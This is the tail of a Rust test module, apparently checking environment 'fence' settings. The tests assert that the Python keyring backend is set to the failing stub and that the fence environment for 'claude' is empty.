        assert_eq!(env["PYTHON_KEYRING_BACKEND"], "keyring.backends.fail.Keyring");
        assert!(fence_env("claude").is_empty());
    }
}
